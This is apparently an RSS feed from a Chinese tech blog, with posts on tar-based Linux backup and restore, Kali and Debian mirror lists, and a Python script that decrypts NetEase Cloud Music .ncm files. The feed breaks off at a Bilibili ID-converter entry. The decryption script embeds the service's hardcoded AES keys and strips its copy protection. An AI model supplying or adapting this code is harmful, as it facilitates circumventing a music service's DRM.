<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>所有文章 - bysec</title>
        <link>https://www.bysec.cn/posts/</link>
        <description>所有文章 | bysec</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>CNbysec@foxmail.com (bysec)</managingEditor>
            <webMaster>CNbysec@foxmail.com (bysec)</webMaster><lastBuildDate>Tue, 01 Jun 2021 00:00:00 &#43;0000</lastBuildDate><atom:link href="https://www.bysec.cn/posts/" rel="self" type="application/rss+xml" /><item>
    <title>Linux系统备份与还原</title>
    <link>https://www.bysec.cn/20210601/</link>
    <pubDate>Tue, 01 Jun 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20210601/</guid>
    <description><![CDATA[<p>在 使用Ubuntu之前，相信很多人都有过使用Windows系统的经历。如果你备份过Windows系统，那么你一定记忆犹新：首先需要找到一个备份工 具(通常都是私有软件)，然后重启电脑进入备份工具提供的软件环境，在这里备份或者恢复Windows系统。Norton Ghost是备份Windows系统时经常使用的备份工具。</p>
<p>在备份Windows系统的时候你可能想过，我能不能把整个C盘都放到一个ZIP文件里去呢。这在Windows下是不可能的，因为在Windows中有很多文件在它们运行时是不允许拷贝或覆盖的，因此你需要专门的备份工具对Windows系统进行特殊处理。</p>
<p>和 备份Windows系统不同，如果你要备份Ubuntu系统(或者其它任何Linux系统)，你不再需要像Ghost这类备份工具。事实上，Ghost 这类备份工具对于Linux文件系统的支持很糟糕，例如一些Ghost版本只能完善地支持Ext2文件系统，如果你用它来备份Ext3文件系统，你可能会 丢失一些宝贵的数据。</p>
<h2 id="1-备份系统">1. 备份系统</h2>
<p>我该如何备份我的Ubuntu系统呢？很简单，就像你备份或压缩其它东西一样，使用TAR。和Windows不同，Linux不会限制root访问任何东西，你可以把分区上的所有东西都扔到一个TAR文件里去！</p>
<p>首先成为root用户：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo su
</code></pre></td></tr></table>
</div>
</div><p>然后进入文件系统的根目录(当然，如果你不想备份整个文件系统，你也可以进入你想要备份的目录，包括远程目录或者移动硬盘上的目录)：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /
</code></pre></td></tr></table>
</div>
</div><p>下面是我用来备份系统的完整命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">tar cvpzf backup.tgz –exclude<span class="o">=</span>/proc –exclude<span class="o">=</span>/lost+found –exclude<span class="o">=</span>/backup.tgz –exclude<span class="o">=</span>/mnt –exclude<span class="o">=</span>/sys /
</code></pre></td></tr></table>
</div>
</div><p>让我们来简单看一下这个命令：</p>
<p>“tar”当然就是我们备份系统所使用的程序了。</p>
<p>“cvpfz”是tar的选项，意思是“创建档案文件”、“保持权限”(保留所有东西原来的权限)、“使用gzip来减小文件尺寸”。</p>
<p>“backup.gz”是我们将要得到的档案文件的文件名。</p>
<p>“/”是我们要备份的目录，在这里是整个文件系统。</p>
<p>在 档案文件名“backup.gz”和要备份的目录名“/”之间给出了备份时必须排除在外的目录。有些目录是无用的，例如“/proc”、“/lost+ found”、“/sys”。当然，“backup.gz”这个档案文件本身必须排除在外，否则你可能会得到一些超出常理的结果。如果不把“/mnt”排 除在外，那么挂载在“/mnt”上的其它分区也会被备份。另外需要确认一下“/media”上没有挂载任何东西(例如光盘、移动硬盘)，如果有挂载东西， 必须把“/media”也排除在外。</p>
<p>有人可能会建议你把“/dev”目录排除在外，但是我认为这样做很不妥，具体原因这里就不讨论了。</p>
<p>执行备份命令之前请再确认一下你所键入的命令是不是你想要的。执行备份命令可能需要一段不短的时间。</p>
<p>备份完成后，在文件系统的根目录将生成一个名为“backup.tgz”的文件，它的尺寸有可能非常大。现在你可以把它烧录到DVD上或者放到你认为安全的地方去。</p>
<p>在备份命令结束时你可能会看到这样一个提示：’tar: Error exit delayed from previous errors’，多数情况下你可以忽略它。</p>
<p>你还可以用Bzip2来压缩文件，Bzip2比gzip的压缩率高，但是速度慢一些。如果压缩率对你来说很重要，那么你应该使用Bzip2，用“j”代替命令中的“z”，并且给档案文件一个正确的扩展名“bz2”。完整的命令如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">tar cvpjf backup.tar.bz2 –exclude<span class="o">=</span>/proc –exclude<span class="o">=</span>/lost+found –exclude<span class="o">=</span>/backup.tar.bz2 –exclude<span class="o">=</span>/mnt –exclude<span class="o">=</span>/sys /
</code></pre></td></tr></table>
</div>
</div><h2 id="2-恢复系统">2. 恢复系统</h2>
<p>在进行恢复系统的操作时一定要小心！如果你不清楚自己在做什么，那么你有可能把重要的数据弄丢，请务必小心！</p>
<p>接着上面的例子。切换到root用户，并把文件“backup.tgz”拷贝到分区的根目录下。</p>
<p>在 Linux中有一件很美妙的事情，就是你可以在一个运行的系统中恢复系统，而不需要用boot-cd来专门引导。当然，如果你的系统已经挂掉不能启动了， 你可以用Live CD来启动，效果是一样的。你还可以用一个命令把Linux系统中的所有文件干掉，当然在这里我不打算给出这个命令！</p>
<p>使用下面的命令来恢复系统：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">tar xvpfz backup.tgz -C /
</code></pre></td></tr></table>
</div>
</div><p>如果你的档案文件是使用Bzip2压缩的，应该用：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">tar xvpfj backup.tar.bz2 -C /
</code></pre></td></tr></table>
</div>
</div><p>注意：上面的命令会用档案文件中的文件覆盖分区上的所有文件。</p>
<p>执行恢复命令之前请再确认一下你所键入的命令是不是你想要的，执行恢复命令可能需要一段不短的时间。</p>
<p>恢复命令结束时，你的工作还没完成，别忘了重新创建那些在备份时被排除在外的目录：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mkdir proc
mkdir lost+found
mkdir mnt
mkdir sys
</code></pre></td></tr></table>
</div>
</div><p>当你重启电脑，你会发现一切东西恢复到你创建备份时的样子了！</p>]]></description>
</item><item>
    <title>kali 修改为国内源</title>
    <link>https://www.bysec.cn/20210501/</link>
    <pubDate>Sat, 01 May 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20210501/</guid>
    <description><![CDATA[<h2 id="打开配置文件">打开配置文件</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">vim /etc/apt/sources.list
</code></pre></td></tr></table>
</div>
</div><h2 id="kali源">kali源</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#中科大</span>
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
 
<span class="c1">#阿里云</span>
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 
<span class="c1">#清华大学</span>
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
 
<span class="c1">#浙大</span>
deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
 
<span class="c1">#东软大学</span>
deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
 
<span class="c1">#官方源</span>
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
</code></pre></td></tr></table>
</div>
</div><h2 id="debian源">debian源</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中科大源</span>
deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free
deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free
deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free
deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free

<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span>
<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span>
<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span>
<span class="c1">#deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span>

<span class="c1"># 阿里云</span>
deb http://mirrors.aliyun.com/debian/ buster main non-free contrib
deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib
deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib
deb http://mirrors.aliyun.com/debian-security buster/updates main

<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.aliyun.com/debian-security buster/updates main</span>

<span class="c1"># 网易源</span>
deb http://mirrors.163.com/debian/ buster main non-free contrib
deb http://mirrors.163.com/debian/ buster-updates main non-free contrib
deb http://mirrors.163.com/debian/ buster-backports main non-free contrib
deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib

<span class="c1">#deb-src http://mirrors.163.com/debian/ buster main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib</span>
<span class="c1">#deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib</span>

<span class="c1"># 官方源</span>
deb http://deb.debian.org/debian buster main contrib non-free
deb http://deb.debian.org/debian buster-updates main contrib non-free
deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free

<span class="c1">#deb-src http://deb.debian.org/debian buster main contrib non-free</span>
<span class="c1">#deb-src http://deb.debian.org/debian buster-updates main contrib non-free</span>
<span class="c1">#deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="更新软件列表并更新软件">更新软件列表并更新软件</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade -y
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>论如何使用Python解密ncm文件</title>
    <link>https://www.bysec.cn/20210401/</link>
    <pubDate>Thu, 01 Apr 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20210401/</guid>
    <description><![CDATA[<blockquote>
<p>网易云音乐把.mp3音乐文件加密为.ncm文件，导致不能将下载好的音乐复制到其它设备，或使用非网易云音乐播放器播放，该程序可将.ncm文件逆向解密为.mp3文件，并保留原始音质。</p>
</blockquote>
<h2 id="python实例">python实例</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="c1"># 依赖pycrypto库</span>

<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="n">core_key</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="s2">&#34;687A4852416D736F356B496E62617857&#34;</span><span class="p">)</span>
    <span class="n">meta_key</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="s2">&#34;2331346C6A6B5F215C5D2630553C2728&#34;</span><span class="p">)</span>
    <span class="n">unpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))]</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">header</span><span class="p">)</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;4354454e4644414d&#39;</span>
    <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">key_length</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">key_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key_length</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">key_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">key_length</span><span class="p">)</span>
    <span class="n">key_data_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">key_data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">key_data_array</span><span class="p">)):</span> <span class="n">key_data_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x64</span>
    <span class="n">key_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key_data_array</span><span class="p">)</span>
    <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">core_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">key_data</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">key_data</span><span class="p">))[</span><span class="mi">17</span><span class="p">:]</span>
    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_data</span><span class="p">)</span>
    <span class="n">key_data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">key_data</span><span class="p">)</span>
    <span class="n">key_box</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
    <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">last_byte</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">key_offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">swap</span> <span class="o">=</span> <span class="n">key_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">swap</span> <span class="o">+</span> <span class="n">last_byte</span> <span class="o">+</span> <span class="n">key_data</span><span class="p">[</span><span class="n">key_offset</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">key_offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">key_offset</span> <span class="o">&gt;=</span> <span class="n">key_length</span><span class="p">:</span> <span class="n">key_offset</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">key_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key_box</span><span class="p">[</span><span class="n">c</span><span class="p">]</span>
        <span class="n">key_box</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="n">swap</span>
        <span class="n">last_byte</span> <span class="o">=</span> <span class="n">c</span>
    <span class="n">meta_length</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">meta_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">meta_length</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">meta_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">meta_length</span><span class="p">)</span>
    <span class="n">meta_data_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">meta_data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">meta_data_array</span><span class="p">)):</span> <span class="n">meta_data_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0x63</span>
    <span class="n">meta_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">meta_data_array</span><span class="p">)</span>
    <span class="n">meta_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">meta_data</span><span class="p">[</span><span class="mi">22</span><span class="p">:])</span>
    <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">meta_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">meta_data</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">meta_data</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)[</span><span class="mi">6</span><span class="p">:]</span>
    <span class="n">meta_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">meta_data</span><span class="p">)</span>
    <span class="n">crc32</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">crc32</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">crc32</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">image_size</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">image_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">image_size</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">image_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">image_size</span><span class="p">)</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="n">meta_data</span><span class="p">[</span><span class="s1">&#39;musicName&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">meta_data</span><span class="p">[</span><span class="s1">&#39;format&#39;</span><span class="p">]</span>
    <span class="n">m</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">file_path</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="n">file_name</span><span class="p">),</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x8000</span><span class="p">))</span>
        <span class="n">chunk_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">chunk_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
            <span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
            <span class="n">chunk</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key_box</span><span class="p">[(</span><span class="n">key_box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">key_box</span><span class="p">[(</span><span class="n">key_box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">]</span>
        <span class="n">m</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
    <span class="n">m</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="kn">import</span> <span class="nn">sys</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">file_path</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">dump</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python ncmdump.py </span><span class="se">\&#34;</span><span class="s2">File Name</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="工具">工具</h2>
<p><a href="https://github.com/unlock-music/unlock-music" target="_blank" rel="noopener noreffer">https://github.com/unlock-music/unlock-music</a></p>]]></description>
</item><item>
    <title>B站AV号BV号互相转换脚本</title>
    <link>https://www.bysec.cn/20210301/</link>
    <pubDate>Mon, 01 Mar 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
